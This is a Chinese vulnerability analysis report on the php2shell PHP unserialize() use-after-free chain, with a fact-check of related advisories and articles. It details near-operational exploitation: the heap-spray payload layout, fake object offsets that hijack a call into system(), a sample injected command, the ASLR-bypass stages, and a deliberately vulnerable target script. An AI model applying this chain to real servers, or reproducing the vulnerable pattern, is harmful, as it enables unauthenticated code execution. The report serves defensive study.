# php2shell 漏洞分析报告

> 研究对象：公开 PoC <https://github.com/iQingshan/php2shell>（本地副本 `poc/php8_remote.py`）、
> 复现文章 <https://mp.weixin.qq.com/s/tGc9FhasC9blhCgYxSB41w>、
> 官方公告 CVE-2026-109618 / GHSA-w8hw-w9fx-j79w、CVE-2026-109619 / GHSA-6wmf-4rv5-p3rp。
> 全部实验在自建本地靶场（WSL2 + 127.0.0.1）与本机 XAMPP 内完成，未触及任何外部主机。
> 生成日期：2026-10-22。

---

## 0. 一页结论（先看这里）

| 问题 | 实测结论 |
|---|---|
| 这是"一个"漏洞吗 | 不是。**官方两个 CVE 是 PHP 内核级缺陷（mod_php 下无需任何应用代码）；公开 PoC 走的是另一条路：应用层 `unserialize()` + 用户态 `Serializable` 类的 use-after-free。** 两者的触发点、缓解手段完全不同，详见 §7。 |
| 需要过 ASLR 吗 | **需要突破 4 类地址随机化**（libc/libphp 的 mmap 基址、PIE 的 `executor_globals`、ZendMM 堆块基址、`zend_class_entry` 地址）。 |
| 需要额外信息泄露吗 | **不需要。** 单个 UAF 读原语自己把全部地址扫出来（R-2~R-6 全是它的调用）。ASLR 在这条链上不是有效防线。 |
| 突破 ASLR 的代价 | 冷启动（服务器刚重启、无任何缓存）**2447 次请求 / 111.5 秒**，其中 437 次读探测失败（HTTP 500）。复用 DSO 基址缓存后 **532 次 / 4.1 秒**。单线程串行，无并发。 |
| ASLR=0 会更便宜吗 | **几乎一样**（2447 次 / 103 s）。因为成本由"固定扫描流程"决定，不是靠猜；地址空间布局在这台靶机上高度确定（见 §5.2）。 |
| 应用侧必须满足什么 | 三条硬条件，缺一不可：① 对攻击者可控字符串调用 `unserialize()`；② 进程内存在可实例化的 `Serializable` 类，其 `unserialize()` 里再做一次嵌套 `unserialize()` 并紧接着写一个属性（触发 HashTable 扩容）；③ 之后对反序列化结果再做一次遍历/序列化（`serialize()`/`var_dump()`/`print_r()` 等）。 |
| `__unserialize()` 能替代吗 | **不能**，它被推迟到 `var_destroy()` 阶段执行，此时所有 `R:` 已解析完，嵌套调用拿不到共享 var_hash（§3.2）。 |
| 哪些配置能挡住 | **只有"移除 gadget 类"和"不用 `unserialize()` 处理不可信输入"能挡住。** 实测 `open_basedir`、`memory_limit=20M`、`memory_limit=-1`、`session.upload_progress.enabled=0`、关掉 HTTP keep-alive、`MaxRequestsPerChild 60` **六组全部照常 RCE**（§6.5）；`disable_functions`（含 `system`）在矩阵里那一组停在 R-4，但判别实验（§6.5.1，带外 libc 基址）证明它**不是缓解**——同配置一旦拿到 libc 基址照样 `uid=33` RCE，失败纯属盲扫定位器脆弱。`disable_classes` 对应用运行时声明的 gadget 类无效（同样 RCE，§6.5.1）。真正在 R-1 一步断链的是"无 `Serializable` gadget"和"`allowed_classes=false`"（§6.5.2）。官方 ini 缓解针对的是内核级 CVE，不是这条应用层链。 |
| SAPI 边界 | Apache **mod_php（prefork、NTS）** 实测端到端 RCE 成功（www-data）。**FPM 需要额外应用条件**，本靶场未安装 php8.4-fpm，未做端到端验证（§6.2）。**PHP 内置 server / CLI**：原语成立但没有 worker 复用与请求语义，PoC 不适用。 |
| RCE 拿到的是什么权限 | **worker 自身凭据，靶场实测 = `www-data`(uid 33)、`CapEff=0`、无 seccomp/AppArmor。** 这条链**不是提权漏洞**；要 root/其他用户/宿主机**必须另配 LPE**（内核 CVE、SUID/`sudo`、容器逃逸等，属另一类漏洞，本报告未端到端演示）。防御上把 worker 沙箱化（`NoNewPrivs=1`/seccomp/`CapDrop=all`/只读根 + DocumentRoot 不给写权）能限制爆炸半径（§6.8）。 |
| 线程安全（ZTS） | **ZTS 直接断链**：`executor_globals` 不再是可解析的符号，宏展开成 TLS 查找；链上没有任何替代路径。 |
| Windows / XAMPP | 本机 XAMPP（PHP **8.0.12 ZTS** + Apache 2.4.51 Win64）：**UAF 读原语可复现**，但 **端到端 RCE 结构上不可能** —— PoC 的 R-2/R-3/R-4 全是 ELF/GOT 逻辑，Windows 是 PE/COFF + IAT；本机 4787 个 PE 镜像 0 个能通过 PoC 的 ELF 头判定（§6.3、附录 `docs/windows-side.md`）。 |
| 版本 | 靶场 PHP 8.4.24（受影响区间 `< 8.4.27`）实测成功。PoC 的常量按 `php:8.5-apache` 一个构建写死，**打 8.4 / 非 Docker 布局必须重标定四处**：两处偏移（handler 200→192、`EG.class_table` 0x1D0→实测 0x1B8）、page map 基址自校准（0x250→实测 0x260）、libc 判据（`e_phnum>=12`→改用符号确认），见 §6.4、§8.3。 |
| 一句话风险定性 | 对一个"把 `unserialize()` 用在用户输入上、且代码里还留着 `Serializable` 类"的 mod_php 站点，这是一条**未认证、默认配置、可稳定拿下 web worker 权限**的链；ASLR/`disable_functions` 都挡不住，唯一有效的是改代码或升级。 |
| 复现文章说得对吗 | **部分不对。** 文章的"堆溢出/GC 缺陷"（实为 var_hash UAF）、"劫持 GOT 函数指针"（链只读 GOT，从不改写，执行靠伪造 handler 表）、"只要目标存在可访问 PHP 页面就能利用"（那是内核级 CVE 的暴露面，本 PoC 需三个应用侧条件）、"受影响版本仅 8.5"（公告是 8.2/8.3/8.4/8.5 四条线）四处需要更正，逐条核对见 **§1.3**，原文见 `refs/wechat_article.md`。 |

---

## 1. 官方情报核对

### 1.1 CVE / GHSA 对照

| 项目 | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| GHSA | `GHSA-w8hw-w9fx-j79w`（"RCE via OOM corruption"） | `GHSA-6wmf-4rv5-p3rp`（"RCE via stale global state"） |
| 严重性 | critical | critical |
| CVSS 向量 | **GHSA JSON 里 `cvss` 字段为 `null`**（本地 `refs/GHSA-*.json` 已核对）—— 任何"9.x 分"的说法都来自第三方，不是官方数据 | 同左 |
| 受影响 | `< 8.2.35`、`< 8.3.36`、`< 8.4.27`、`< 8.5.12` | 同左 |
| 修复 commit | `3584a98bda0f2c0d367255b046798b0d3a221a19`（同时修两个 CVE，`refs/fix.diff` 389 个文件） | 同左 |
| 机理一句话 | OOM 用 `longjmp()` 提前跳出请求，请求内存停在"未初始化完"的非法状态；mod_php 无条件走 request shutdown，于是消费这块非法状态 | 请求级状态被存进 worker 全局（error/session/object/extension state），致命错误（含 OOM）跳过了配对的 reset；请求堆释放后全局仍指向它，下一个请求在**正常初始化之前**消费 → 跨请求 UAF |
| 已确认影响 | mod_php 未认证 RCE（默认输入/内存限制、常规 prefork 多 worker 验证过）；FPM 源码分析判定易感，**但没有公开的完整 FPM exploit**；FrankenPHP 大概率易感；LSAPI 条件性 | mod_php 已确认 RCE（基于 8.5 `fatal_error_backtraces` 生产者 + INI 诊断消费者）；**session upload progress 生命周期路径在 mod_php 与 FPM 都验证过** |
| 官方缓解 | 升级才是唯一完整缓解；`memory_limit=-1` 是主要配置缓解（不完整）；**明确禁止用 `RLIMIT_AS`/`RLIMIT_DATA`**（会让 `mmap()` 失败，正好触发脆弱的 `longjmp()` 路径） | 升级；8.5 上 `fatal_error_backtraces=0`；`session.upload_progress.enabled=0`；必要时 `pm.max_requests=1`；消除攻击者可达的致命错误与初始化前的 INI 诊断 |

公告全文（英文原样）已存 `refs/advisories_full.txt`，本报告 §6/§7/§9 的每个判断都能在那份文本里对应到句子。

### 1.2 两个 CVE 与公开 PoC 的关系：不是一回事

* 公告描述的触发点是**请求启动阶段**（multipart 解析放大内存、`.htaccess`/`php_value` 在 `php_request_startup()` 之前生效、session upload progress 在正常初始化之前被消费）——**攻击面不含任何应用代码**，一个只有 `phpinfo()` 的站也能被打。
* 公开 PoC 走的是 `unserialize()` 内部 `var_hash`（引用表）的生命周期缺陷：`var_push()` 把裸 `zval*` 存进调用方 HashTable 的桶里，桶所在数组被 `zend_hash_do_fresize()` 释放后表项成了悬垂指针，再用 `s:280`  spray 回收，得到任意读 + 伪造对象执行。
* 关键证据：本地 `refs/fix.diff` 里 `var_unserializer.re` 只增加了 OOM 检查（`ZEND_HAS_OOM()`、可失败分配 `zend_hash_fextend`/`zend_string_falloc`、`incomplete_classes_only`），**完全没有动 var_hash 共享逻辑，也没有在 HashTable 扩容时让注册的表项失效**。也就是说：本 PoC 利用的缺陷在修复 389 个文件的那次提交之后依然存在（至少在我保留的 8.4 源码树上依然如此）。
* **结论**：把这条 PoC 标为 "CVE-2026-109618/109619 的 EXP" 在本地证据上**站不住**。它是"PHP 内核里另一个长期存在的 use-after-free，加上应用层 gadget"。文章与仓库标题里的 "php2shell" 更适合当作链名而不是 CVE 名。（`docs/gadget-analysis.md` §8 有逐条源码引用。）

---

### 1.3 对复现文章的逐条核对（用户要求的第二个信息源）

文章：《核弹级 PHP Core 远程代码执行漏洞（CVE-2026-109618/109619）》，公众号"安全攻防屋"，2026-10-21。
（此前两次 WebFetch 被微信"环境异常"校验页拦截，本次通过浏览器取回正文，全文约 830 字 + 演示视频截图，已按原句核对。）

| 文章原句 | 核对结果 | 依据 |
|---|---|---|
| "底层内存破坏漏洞，依托 **zend 引擎对象 GC 缺陷**完成**堆溢出**利用" | **机理描述错误。** 这条链是 **use-after-free**（`var_hash` 表项悬垂 + HashTable 扩容 `pefree` 旧桶数组），不是堆溢出；参与缺陷的是 **序列化引用表的生命周期**，不是对象 GC。公告里 109619 才是 UAF、109618 是 `longjmp()` 导致的非法状态消费，两者也都不是堆溢出 | §3.1~§3.4；`refs/84_ext_standard_var_unserializer.re:126-143`、`refs/84_Zend_zend_hash.c:1041/1542` |
| "通过上千次请求泄露内存地址、解析 libc 符号、**劫持 GOT 函数指针**" | **前半句准确，后半句错误。** "上千次请求泄露地址 + 解析 libc 符号"与我实测一致（2447 请求，R-2/R-4 就是符号解析）。但 **GOT 从未被改写**：链只把 GOT 当"识别 libc 的线索"读一次（`libc_locator_v2` 从 `PT_DYNAMIC` 读 GOT 窗口再分桶找段）；执行来自**伪造的 `zend_object.handlers->get_properties_for`**。所以 Full RELRO 与本链无关（§5.6） | §3.6、§5.6；`lab/chain_lab.py:178-266` |
| "攻击无需账号权限、不需要文件上传入口，**只要目标存在可访问 PHP 页面就能发起利用**" | **对这条 PoC 不成立。** "只要有 PHP 页面"只适用于两个**内核级** CVE（109618 用 multipart 在请求启动阶段触发、109619 用 `.htaccess`/`php_value` 诊断或 session upload progress，都在应用代码之前）。公开 PoC 必须有 §6.1 的三个应用侧条件；靶机换成"没有 `Serializable` 类的普通页面"就打不动 | §6.1、§7；`refs/advisories_full.txt` 两段 "Susceptibility"/"Producers/Consumers" |
| "受影响版本：**PHP 8.5 全部子版本**" | **漏报了 8.2/8.3/8.4。** 公告区间是 `< 8.2.35`、`< 8.3.36`、`< 8.4.27`、`< 8.5.12`。本机 8.4.24 实测端到端 RCE，正是被漏掉的那一档 | §1.1 表；`lab/evidence/case_*.json` |
| "严重性核弹级 / 无鉴权 RCE / 拿到 www-data" | **成立。** 本靶场 8/8 组配置全部拿到 `uid=33(www-data)`（其中 `disable_functions` 组需带外 libc 基址短路掉脆弱的 R-4 盲扫，见 §6.5.1，它并非真缓解）；公告 severity 也是 critical | §6.5、§6.5.1 |
| "Docker 一键靶场（PHP 8.5 + apache），把 `remote_app.php` 放进 `/var/www/html`，跑 py 脚本执行 `whoami` 输出到 www 目录，访问得到 www-data，成功 RCE" | **与上游代码一致，且解释了"为什么原作者开箱就能跑"**：`poc/Dockerfile` 用的就是 `php:8.5-apache`，PoC 里 200 / `EG+0x1D0` / map `0x250` / `e_phnum>=12` 四个常量全是按那一个构建调优的。换到 8.4 或非 Docker 布局必须重标定（§8.3 的四处补丁） | `poc/Dockerfile`；§6.4、§8.3 |
| "漏洞根源为 Zend 引擎**垃圾回收机制**的对象引用管理缺陷" | 同第 1 条：应为"反序列化引用表（var_hash）生命周期缺陷"。**引用计数（`Z_ADDREF`）确实在链上出现一次**（伪造 refcount 让 `php_add_var_hash()` 的 `Z_ADDREF_P` 把命令首字节 `0x09` 加成 `0x0A`），但这不是 GC | §3.6；`poc/php8_remote.py:1024` 的 `Command (after GC_ADDREF)` |

一句话总结文章与事实的差别：它把"三个不同东西"合成了一件事 —— **内核级 CVE（无需应用代码）**、**公开 PoC 的应用层 UAF gadget**、**GOT 劫持（本链其实没有）**。这三者在写缓解措施时对应完全不同的动作，照文章的描述去做防御（比如加 RELRO、修 GC、盯文件上传）会全部落空。

### 1.4 对第二篇公众号文章的逐条核对

文章：`https://mp.weixin.qq.com/s/8YbU1vk9dZZSQSwV8GWziQ`（2026-10-21，与 §1.3 那篇风格克制、观点独立的一篇）。它的主框架——"洞真但没那么神、更像 lab 复现不是武器化 EXP、别因默认配置拖着不升、ThinkPHP/Discuz 只要跑在未修复 PHP 上同样被覆盖"——**与本报告结论一致**（§0、§6.4、§9）。它那张"公开链挑环境"的表逐条核对如下：

| 该文的"利用条件" | 本靶场核对 | 依据 |
|---|---|---|
| 运行方式：需 Apache prefork + mod_php，FPM 生命周期不同不能直接套这条链（但承认"官方通告确认 FPM 侧另有路径"） | ✅ **对本 PoC 准确**：链依赖"同一 worker 的堆跨请求存活"（§4.3/§6.6）。诚实标注：本靶场只做 mod_php、**未做 FPM 反向对照**，所以"FPM 打不进来"= 这条链没为 FPM 写，≠ FPM 免疫；"FPM 另有路径"指内核级 CVE（§7） | §6.2、§7 |
| **`display_errors`：完整链需要 On，Off 下只完成第一阶段堆泄漏** | ❌ **对本 PoC 不准确（实测）**。这条链的读原语靠**应用自己 `echo serialize($result)` 的回显 sink**（§6.1 条件③），不走 PHP 报错输出。靶机 `poc/remote_app.php:101` 本来就 `ini_set('display_errors','0')`；再叠加 php.ini `display_errors=Off / error_reporting=0`，链仍端到端 RCE | `lab/verify_display_off.sh` → `lab/evidence/verify_display_off.json`（`uid=33(www-data)`，2447 请求）；§6.1、§6.5 |
| **内存/请求体：lab 用 `memory_limit=8M`；默认 128M 按 lab 形状打不进来** | ⚠️ **前提搞反了（实测）**：`memory_limit` 不是本链闸门——`128M` 与 §6.5 的 `-1` 都照样 RCE。"小内存 limit 才触发"属于 **CVE-2026-109618（OOM 损坏）** 的机理（要用受限内存把 multipart 撑爆触发 `longjmp()`），与本应用层 `unserialize()` 链无关。文章成立的那半句是"偏移绑具体构建/请求形状、换站要重标定"（= §6.4） | `lab/evidence/verify_display_off.json`；§6.5、§6.4 |
| worker 数量：单 worker，A/B 两请求要落同一进程 | ✅ **准确且关键**：正是本报告整条链的前提与 `--cache`/亲和性设计（§4.3、§6.6） | §4.3、§6.6 |
| 构建：PHP 8.4.26 特定构建、偏移跟版本/编译选项走、非一键工具 | ✅ **准确**：与 §6.4 四处校准一致（本靶场 8.4.24，同样重标定后才通） | §6.4、§8.3 |
| ASLR：开启时约 9/10、靠重试；泄漏绑堆布局；"ASLR 不要关" | ✅ **准确**：本链是"泄漏/推导地址、不是猜"，§5.4 实测 ASLR=0 不提速；§5.5 冷启动可靠性与该文口径吻合 | §5.4、§5.5 |

**这篇文章的主要问题不是结论，而是"把两类漏洞的前提并进了一张表"**：`display_errors`、`memory_limit=8M`、超长 `PHPSESSID`、OOM 日志、`session.upload_progress`（它检测段列的入口）都属**内核级 109618/109619** 的触发/泄漏通道（且能被 ini 缓解）；而这条**应用层 `unserialize()` 公开 PoC** 的泄漏通道是业务回显 sink、`ini` 关不掉（§6.5）。因此对这条链把 `display_errors`/`memory_limit` 当作"利用前提"或"缓解开关"都不成立——照此判断"关了报错 / 用默认 128M 就安全"会误判风险。§7 的三列对照表正是用来钉死这个边界。

---

## 2. 实验环境（可复现）

| 角色 | 配置 | 用途 |
|---|---|---|
| 主靶场 | WSL2 · Kali 2026.3 · kernel 6.18.54.1-microsoft-standard-WSL2 · Apache **2.4.68 (Debian)** + **mod_php 8.4.24 NTS**（prefork，StartServers 5，MaxRequestWorkers 150，KeepAlive On）· `randomize_va_space=1` · 监听 `127.0.0.1:8080` · 目标脚本 `/var/www/html/remote_app.php` | 端到端 RCE、七阶段成本、前置条件矩阵 |
| 对照 | 本机 **XAMPP**：Apache/2.4.51 Win64 + PHP **8.0.12 ZTS**（`php8ts.dll`）· `D:\xampp` | 验证 Windows/ZTS 边界 |
| 参考源码 | `refs/84_*`（PHP 8.4 `zend_alloc.c/.h`、`zend_object_handlers.h`、`var_unserializer.re`、`var.c`、`zend_hash.c`）、`refs/85_Zend_zend_alloc.c`、`lab/src8012`（8.0.12） | 偏移/结构的证据来源 |
| 上游 PoC | `poc/php8_remote.py`（未改动）、`poc/remote_app.php` | 攻击侧 + 目标侧代码 |
| 研究驱动 | `lab/chain_lab.py`（在上游代码上打校准补丁）、`lab/run_case.sh`、`lab/cases.sh`、`lab/reliability.sh`、`lab/diag_disable.sh`、`lab/probe_affinity.sh`、`lab/dump_live.py` 等 | 分组实验与测量 |

一键搭建（管理员 PowerShell）：

```bat
wsl.exe -d kali-linux -u root -- bash /mnt/f/VibeCoding/php2shell-research/lab/setup_target.sh 8080
```

脚本内容见 [lab/setup_target.sh](file:///F:/VibeCoding/php2shell-research/lab/setup_target.sh)：`a2dismod mpm_event && a2enmod mpm_prefork php8.4`、`Listen 8080`、把 `poc/remote_app.php` 装到 `/var/www/html`、起 Apache 并自检。

目标端代码就是 PoC 仓库自带的那一份（**它本身就是"存在漏洞的应用"的最小样例**）：

```php
<?php
// poc/remote_app.php —— 三个硬条件都满足的最小目标
ini_set('display_errors', '0');
error_reporting(E_ALL & ~E_DEPRECATED);          // 见 §6.1：只是为了让外泄数据干净

class CachedData implements Serializable         // 条件②：Serializable 桥
{
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void
    {
        unserialize($data)->x = 0;               // 嵌套反序列化 + 第 9 次属性写入 → arData 扩容
    }
}

$result = unserialize($_POST['cook']);           // 条件①：不可信输入进 unserialize()
echo serialize($result);                         // 条件③：遍历被破坏的值 → get_properties_for
```

---

## 3. 漏洞机理（源码级，含偏移测量）

### 3.1 根因：`var_hash` 存的是"别人拥有的"裸指针

`unserialize()` 用一张 `var_hash`（`R:`/`r:` 引用表）记录"已经解析出来的 zval"，编号即引用序号。入表函数 `var_push()`（`refs/84_ext_standard_var_unserializer.re:126-143`）存的是 **`zval*` 指针本身**：

```c
var_push(var_hash, ...)  →  VAR_ENTRIES_S(var_entries)[var_count] = zval_ptr
```

而解析对象属性时，这些 `zval_ptr` 正是 `arData[i].val` —— 桶数组是 unserializer 通过 `zend_hash_alloc`/`zend_hash_do_fresize` 自己分配、自己**可以重新分配**的。`var_push()` 与桶数组之间没有任何失效通知。

### 3.2 触发：Serializable 桥不设 `serialize_lock`，于是两次解析共用一张表

`C:` 前缀走 `[.re]:823-826`：

```c
if (ce->unserialize(rval, ce, (const unsigned char*)buf, datalen,
                    (zend_unserialize_data *)var_hash) == SUCCESS) { ... }
```

`ce->unserialize == zend_user_unserialize`（`refs/84_..._var.c` 的 `[ifaces]:475-477`），它直接调用用户类的 `unserialize()` 方法，**且不加 `BG(serialize_lock)`**。于是用户代码里再调一次 `unserialize()` 时，内层解析**复用了外层正在使用的 var_hash**（`[.re]:83-86`）。这就是"嵌套解析必须在同一请求内、由 unserializer 自己同步发起"的唯一路径 —— 所以 gadget 必须是 `Serializable`，`__unserialize()` 不行：

* `O:` + `__unserialize` 走 `object_common()` 的 `has_unserialize` 分支（`[.re]:846-873`），把对象和数据数组塞进两个 `var_dtor_entries` 槽（`Z_EXTRA_P(tmp) = VAR_UNSERIALIZE_FLAG`），用户代码要等到 `PHP_VAR_UNSERIALIZE_DESTROY`（`[var.c]:1578` → `var_destroy()` `[.re]:240-329`）才被调用 —— 那时外层所有 `R:` 早就解析完，且 `[.re]:92-95` 已销毁外层 var_hash，新表项无处可利用。

### 3.3 悬垂：第 9 次属性写入触发 8→16 扩容，旧块被 `pefree`

`CachedData::unserialize()` 里 `unserialize($data)->x = 0`：内层产物是 `stdClass`，属性表初始 8 桶；随后写 `->x` 是第 9 次插入，`nNumUsed(8) >= nTableSize(8)` 命中 `ZEND_HASH_IF_FULL_DO_RESIZE`（`refs/84_Zend_zend_hash.c:1041`，在插入之前），走 `zend_hash_do_fresize` 8→16：

```c
// zend_hash.c:1542 附近
pefree(ht->arData, ht->u.flags & HASH_FLAG_PERSISTENT);
```

新块分配成功（8.4 里是可失败分配 `zend_hash_fextend`），旧块立即释放。**var_hash 里编号 4..11 的表项（`p0..p7` 各自的 `&arData[i].val`）仍指向已释放的旧块**。整个请求不会崩，因为桶内容被 memcpy 进了新块（`[zh]:1541`），对象语义完好 —— 悬垂的只是表项。

释放的旧块大小：`HT_SIZE_EX(8, HT_SIZE_TO_MASK(8))` = `8*32 + 2*8*4 = 320` 字节（`refs/84_Zend_zend_hash.h:466-473`；哈希索引区是 `2*nTableSize` 个 `uint32`，**不是** PoC 注释说的 288，见 §10.1）。

### 3.4 回收：`s:280` 落在同一个 bin，LIFO 命中

ZendMM 分箱（实测于 `lab/src8012`/`refs/84_Zend_zend_alloc.c` + `dump_live.py` 现场核对）：

| 项 | 值 |
|---|---|
| 堆块 | 2 MiB `[anon:zend_alloc]` 映射，`mmap` 基址 2 MiB 对齐 |
| 块头 | `heap` 指针、`next`、`prev`、`free_pages`、`free_tail`、`num` 共 0x40（8.4 实测表头见 §4.4） |
| page map | 头 0x40 + `zend_mm_heap` 0x1c0 + `free_map` 0x40 ⇒ **块内偏移 0x260**，每项 4 字节（**不同构建会变**，PoC 用的是 0x250；本报告用自校准锚点解决，见 §4.4） |
| bin 16 | `_(16, 320, 64, 5, x, y)`：数据 **320 B**、一个 run **64 节点 / 5 页**（≈12.8 节点/页），节点地址 `run_start + k*320`（`refs/84_Zend_zend_alloc_sizes.h:49`） |
| 请求 305 B → | 归一化到 bin 16（320 B），与被释放的 320 B 旧块**同 bin** |

`SPRAY_LEN = 280` 的 `zend_string` 请求内存 = `24 (zend_string 头) + 280 + 1 (结尾 NUL) = 305` → 同 bin 16。空闲链表 LIFO，刚释放的 320 B 块首节点立刻被 spray 拿走，于是 **PHP 把攻击者完全可控的 280 字节写进了悬垂表项指向的那块内存**。

### 3.5 任意读原语：一个 `R:` = 一次可控指针 + 一次类型混淆

`isstring_read(A)`（`poc/php8_remote.py:206-247`）每轮做两件事：

1. 复用同一 gadget 让表项悬垂、用 32 条 `s:280` 回收；
2. 在 spray 的**偏移 40**（= 旧块基址 B+64 = var_hash 表项 4 指向的位置）写入：

```
偏移 40..47  = 目标地址 A           ; zval.value
偏移 48..51  = 0x06                 ; zval.u1.type_flags = IS_STRING
```

其余桶位置写 `0xBBBB0000+k` + type `0x04`（IS_LONG），让 `serialize()` 输出保持干净可解析。

3. 负载尾部追加 `R:4`：unserializer 对表项 4 执行 `ZVAL_COPY`，**读的是表项指针所指的那 16 个字节**，也就是刚被 spray 覆写的 `value = A`、`type = IS_STRING`。于是结果数组里第 33 个元素成了"指向 A 的字符串"。
4. `echo serialize($result)` 按 IS_STRING 输出：长度取 `*(uint64*)(A+0x10)`，数据从 `A+0x18` 开始。

> **原语精确表述**：`读 A+0x18 起、长度 = *(u64*)(A+0x10) 的内存，回显在 HTTP 响应里`。
> PHP 8.x 的 `zend_string` 头 = `zend_refcounted_h`(8) + `h`(8) + `len`(8) = 24，故 `len` 正好在 `+0x10`、`val` 在 `+0x18`。
> 附带条件：`A+0x10` 处的 8 字节必须像"正常长度"，否则 `serialize()` 会申请天文数字 → `memory_limit` 致命 → worker 500。这就是扫描时"读到代码就崩"的原因，也是**读失败本身成了另一种信号**。

### 3.6 任意写/执行：伪造 `zend_object` 的 handlers 表

R-7（`_fire_cmd`，`poc/php8_remote.py:956-988`；本报告参数化为 `fire_cmd_v2`）把同一块 spray 改成一张假对象：

| spray 偏移 | 内容 | 含义 |
|---|---|---|
| 40 | `fake_obj = S+104` | 表项 4 处的 zval.value |
| 48 | `0x08` = IS_OBJECT | zval.type_flags |
| **104** | `\x09` + 命令 + `\0` | **假 `zend_object` 的起始地址**，也就是 `system()` 的实参；`zend_object.gc`（refcount 低字节）恰好就是那个 `0x09` |
| 120 | `ce` | `zend_object.ce` = 对象基址 +16（真实 `stdClass` class entry，来自 R-5） |
| 128 | `S` | `zend_object.handlers` = 基址 +24，**指向 spray 自身** ⇒ 整张 handler 表可控 |
| 136 | `1` | `zend_object.properties` = 基址 +32（不会被解引用：`get_properties_for` 已是我们的函数） |
| 200（8.5）/ **192（8.4）** | `system@libc` | `handlers->get_properties_for`，相对 `handlers` 即相对 `S` |

`zend_object` 的字段顺序（`gc` 8 / `handle`+`extra_flags` 8 / `ce` +16 / `handlers` +24 / `properties` +32，见 `refs/84_Zend_zend_types.h:568`）让"对象头"和"命令字符串"重合在 104 这一处：对象基址既是合法的结构起点，又是一段 `sh` 能忽略前导空白的命令行。对照结果：**8.4 与 8.5 的 `zend_object` 完全一致**（`refs/85_Zend_zend_types.h`），8.0.12 少了 `extra_flags` 但对齐后 `ce/handlers/properties` 仍在 +16/+24/+32 —— **这一段跨版本稳定**；跨版本会变的只有下面 192/200 那个 `zend_object_handlers`（另一个结构，8.5 多了 `clone_obj_with`）。

流程：`R:4`（最后一个元素）把类型改成 IS_OBJECT → `echo serialize($result)` 走到
`zend_get_properties_for(Z_OBJ_P(z), ...)`（`refs/84_Zend_zend_object_handlers.h` 处为通用实现）→ **间接调用 attacker 选择的函数指针，实参是对象指针本身** ⇒ 等价于 `system("\tid>/tmp/pwned")`。
首字节 `0x09` 会在 `php_add_var_hash()` 的 `Z_ADDREF_P(var)`（`[var.c]:801`，因伪造 refcount ≠ 1 而在 `[var.c]:765-772` 走引用路径，触发点 `[.re]:1133`）被加 1 变成 `0x0A`；`\t`/`\n` 都是 `sh` 忽略的空白，命令照常执行。

**没有跳转表、没有 ROP、没有 JIT**：一次间接调用直接落在 libc `system()` 上。因此 **`disable_functions` 不在这条执行路径上**（它只改 PHP 用户态函数表，链从不查表）；§6.5 里那一组之所以没打通，失败发生在"定位 libc"而不是"调用 libc"，判别实验见 §6.5.1（已实测：带外 libc 基址下，同一条 `disable_functions=system,...` 配置照常 RCE 到 `uid=33`）。

---

## 4. 七个阶段做什么、代价多少

### 4.1 阶段一览（实测：冷启动，ASLR=1，keep-alive）

| 阶段 | 做什么 | 请求数（累计） | 段内耗时 | 依赖的原语 |
|---|---|---|---|---|
| R-1 `heap_leak()` | 让 8 个桶槽被改写成引用（`ZVAL_NEW_REF` 把新分配 `zend_ref` 指针写进 spray 块），把回显的 `s:280` 与原始 spray 逐字节对比，得到**一个堆指针** | 1 | ~0 s | 一次请求即成 |
| R-2 `scan_for_elf()` | 从堆块基址**向下按 4 KiB 页扫** ELF 头（判定：`e_phoff==64`/`e_ehsize==64`/`e_phentsize==56`/`3<=e_phnum<=20`），拿到附近 DSO 镜像基址列表 | 577 | **98.8 s** | 任意读 |
| R-3 `gnu_hash_resolve()` | 在候选镜像里做 `.gnu_hash` 符号解析，命中 `executor_globals` + `_GLOBAL_OFFSET_TABLE_` 的那个就是 **libphp**；同时定下 `EG` 地址与 GOT | 589 | 0.1 s | 任意读 |
| R-4 libc 定位 | 解析 libphp 的 `PT_DYNAMIC`，读 GOT 窗口 → 按 2 MiB 分桶取每段最低指针 → 逐段向下找镜像头 → 用 `system`+`popen`+`exit` 三个符号确认 libc | 1916 | 7.2 s | 任意读 |
| R-5 class entry | 从 `EG` 读 `class_table`（**本构建 EG+0x1B8**，PoC 硬编码 0x1D0）→ HashTable → 取出 `stdClass` 的 `zend_class_entry*` | 2440 | 5.0 s | 任意读 |
| R-6 spray 槽定位 | 读块头拿 `heap_slot.size` 得到 ~400 KB 窗口 → 自校准找 page map（锚点 `map[0]==0x40000001`）→ 找 bin 16 的 SRUN run → 逐节点探测 `len==280` 的那个 ⇒ `S` | 2446 | 0.1 s | 任意读 |
| R-7 触发 | 上面 §3.6 那条 spray + 结尾 `R:4`，一次请求 | 2447 | 0.3 s | 一次间接调用 |

**总计 2447 请求 / 111.5 s，其中 437 次读探测返回 500（ worker 触发 `memory_limit` 致命，即"自毁式触发"，见 §4.5）。**

> 成本分布很有意思：**98.8 s 里有 ~90% 花在 R-2 的向下扫描**。它扫的是"libphp 相对堆块的距离"，不是"猜地址"。R-4 用了 1327 次请求但只花 7.2 s。换句话说，这条链的时间预算 ≈ 扫描页数 × RTT，与 ASLR 熵无关（§5.4 用 ASLR=0 反证）。

### 4.2 一次真实请求体长什么样

`isstring_read(0x7ffff7279518)` 发出的 POST（`Content-Type: application/x-www-form-urlencoded`，参数名 `cook`，值做了 ASCII 百分号编码）解码后是：

```
a:34:{
  i:0;C:10:"CachedData":195:{O:8:"stdClass":8:{s:2:"p0";i:2863267840;s:2:"p1";i:2863267841;
        s:2:"p2";i:2863267842;s:2:"p3";i:2863267843;s:2:"p4";i:2863267844;s:2:"p5";i:2863267845;
        s:2:"p6";i:2863267846;s:2:"p7";i:2863267847;}}
  i:1;s:280:"<280 字节 spray>"
  ... (i:2 .. i:32，共 32 条同样的 s:280)
  i:33;R:4;
}
```

`C:` 的 195 是内层 `O:` 串长度（由 `_build_inner()` 生成，`poc/php8_remote.py:52-61`）；var_hash 编号顺序是 **1=外层数组、2=`C:` 元素、3=内层返回值、4=p0 … 11=p7**，所以 `REF_BASE=4` 指的是 `p0` 那个槽。响应侧只需在回显里找 `i:33;s:<len>:"..."`。

### 4.3 为什么必须"同一 worker、同一请求顺序"

被释放的旧块、spray、var_hash 表项都只活在**处理这条请求的那个 PHP 进程**里（prefork：一条连接 = 一个子进程）。跨进程读同一地址会读到不同的映射，直接表现为 500。所以链本质上是"有状态的多步会话"。实测见 §6.6：不用 keep-alive 时串行连接几乎均匀轮转到 5 个子进程（最高单个只占 28%），链靠重试仍然成功，代价是失败读从 18% 升到 50%。

### 4.4 page map 定位（这条链在真实靶机上最容易踩空的地方）

